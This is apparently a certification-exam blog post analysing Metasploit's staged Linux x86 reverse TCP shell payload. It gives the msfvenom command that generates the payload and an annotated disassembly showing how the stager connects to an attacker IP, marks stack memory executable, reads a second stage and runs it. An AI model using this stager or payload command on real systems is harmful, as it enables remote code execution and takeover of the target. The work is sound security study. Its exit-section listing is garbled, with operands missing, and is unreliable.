---
layout: post
title: SLAE Exam 5 Shellcode Analysis - Part 3
category: Security
tags: [slae, shell, assembly, programming]
---

Now, we're cooking! We previously looked at two MSF payloads, read_file and the staged version of a bind_tcp shell. Now, we will look at one of the most commonly used MSF payloads out there: the staged reverse tcp shell. I'm assuming it will be very similar to the staged bind tcp shell, but who knows. There's only one way to find out!

## Problem Statement

* Take up at least 3 shellcode samples created using Msfpayload for linux/x86
* Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode
* Present your analysis

I've already hyped up the fact that we'll be taking a look at msfvenom's `linux/x86/shell/reverse_tcp` payload. If you missed [part one]({% post_url 2018-03-11-slae-exam-5-shellcode-analysis-part-1 %}) or [part two]({% post_url 2018-03-11-slae-exam-5-shellcode-analysis-part-2 %}), I highly recommend going back and reading that. Once you're all caught up, rejoin us below!

#### Generating the Files

We'll quickly get started by generating our raw and disassembled files.

```bash
root@kali:~/courses/slae/exam/assignment5# msfvenom -p linux/x86/shell/reverse_tcp -a x86 --platform linux > staged_reverse_shell.raw

root@kali:~/courses/slae/exam/assignment5# ndisasm -b 32 staged_reverse_shell.raw > staged_reverse_shell_analyzed.nasm
```


## Analysis

It's time to dig through the assembly. My guess was right, in that this is very similar to the bind tcp shell we looked at in [part two]({% post_url 2018-03-11-slae-exam-5-shellcode-analysis-part-2 %}), and I'll prove it to you right... now!


#### Make the Socket

```
00000000      xor ebx,ebx             ; Clear EBX
00000002      mul ebx                 ; Clear EAX, EDX
00000004      push ebx                ; [0x0]
00000005      inc ebx                 ; set ebx to 1 (SYS_SOCKET)
00000006      push ebx                ; [0x1, 0x0]
00000007      push byte +0x2          ; [0x2, 0x1, 0x0]
00000009      mov al,0x66             ; SYSCALL(0x66) // man 2 socketcall
0000000B      mov ecx,esp             ; mov *args into ecx
0000000D      int 0x80                ; socketcall(1, *esp) -> socket(2, 1, 0) -> socket(AF_INET, SOCK_STREAM, 0) (see Assignment 1 for details)
```

This is pretty standard. We are just creating a TCP socket for use. If you have trouble understanding the comments, review parts one and two of this series. If you still have trouble, please leave a comment below!


#### Connect to Attacker

```
0000000F      test eax,eax            ; Ensure EAX is not negative
00000011      js 0x57                 ; If EAX < 0, exit
00000013      xchg eax,edi            ; Move socket fd (SOCKFD) to EDI
00000014      pop ebx                 ; Put 0x2 into ebx // [0x1, 0x0]
00000015      push dword 0x81caa8c0   ; [0x81caa8c0, 0x1, 0x0] // IP Address (192.168.202.129)
0000001A      push dword 0x5c110002   ; [0x5c110002, 0x81caa8c0, 0x1, 0x0] // sin_port and sin_family (4444, 0x0002)
0000001F      mov ecx,esp             ; ecx -> [0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000021      push byte +0x66         ; prepare for syscall
00000023      pop eax                 ; SYSCALL(0x66) // man 2 socketcall
00000024      push eax                ; [0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000025      push ecx                ; [*(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000026      push edi                ; [SOCKFD, *(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000027      mov ecx,esp             ; ecx -> [SOCKFD, *(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000029      inc ebx                 ; EBX = 0x3 (SYS_CONNECT)
0000002A      int 0x80                ; socketcall(3, [SOCKFD, *(0x5c110002, 0x81caa8c0, 0x1, 0x0)])
```

Here we tell our newly created socket to connect to our attacker's machine. In my case, I gave msfvenom no arguments, so it automatically used an RHOST value of my local IP *192.168.202.129*, and a port of *4444*. Good to know!


#### Mark Memory for Staged Shellcode

```
0000002C      test eax,eax            ; Check if return value was negative
0000002E      js 0x57                 ; If negative, jump to exit
00000030      mov dl,0x7              ; edx = 0x7
00000032      mov ecx,0x1000          ; ecx = 0x1000
00000037      mov ebx,esp             ; ebx = [SOCKFD, *(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000039      shr ebx,byte 0xc        ; align ebx to a page
0000003C      shl ebx,byte 0xc        ; by clearing last 12 bits of ebx
0000003F      mov al,0x7d             ; SYSCALL(125)
00000041      int 0x80                ; mprotect(ebx, 0x1000, 7) -> make 0x1000 bytes at the stack RWX
```

This is doing the same thing it did with the bind tcp shell. It marks a page of memory on our stack as RWX, so that we can place our staged payload there and run it.


#### Read Staged Shellcode into Memory

```
00000043      test eax,eax            ; Test for negative return code
00000045      js 0x57                 ; If negative, jump to exit
00000047      pop ebx                 ; EBX = SOCKFD // [*(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
00000048      mov ecx,esp             ; ECX -> [*(0x5c110002, ...), 0x66, 0x5c110002, 0x81caa8c0, 0x1, 0x0]
0000004A      cdq                     ; clear EDX (by extending sign bit of eax to edx)
0000004B      mov dh,0xc              ; EDX = 0xC00
0000004D      mov al,0x3              ; SYSCALL(0x3) // man 2 read
0000004F      int 0x80                ; read(SOCKFD, ECX (STACK), 0x00000C00)
```

Here, we receive our staged shellcode from the attacker's machine, and store it on the stack.


#### Jump to Staged Shellcode

```
00000051      test eax,eax            ; Test for negative return code
00000053      js 0x57                 ; If negative, jump to exit
00000055      jmp ecx                 ; If it wasn't, jump to ECX which contains our staged shellcode
```

Finally, as long as no errors have occurred, we are ready to pass execution to the stack, where our staged payload sits awaiting execution.


#### Exit Due to Failure

```
00000057      mov, 0x1                ; SYSCALL(0x1) // man 2 exit
0000005C      mov, 0x1                ; return code of 1 (error because staged shellcode didn't make it)
00000061      int 0x80                ; exit(1)
```

This section of code is mentioned throughout this payload. If at any point, a function returns a negative value in EAX, the payload will jump to this section, causing an exit with a return code of 1, indicating something went wrong.


## Wrapping Up

The `linux/x86/shell/reverse_tcp` payload was very similar to the bind_tcp payload as predicted. One of the key differences here was the fact that the reverse_tcp payload does a lot more to check for errors, which was interesting to see. In any case, I hope you learned as much as I did throughout this exercise, and I encourage you to walk through this process on a different payload. I'd love to hear about what you find or what payloads you choose to analyze! So leave a comment below, and until next time, happy hacking!


###### SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1158
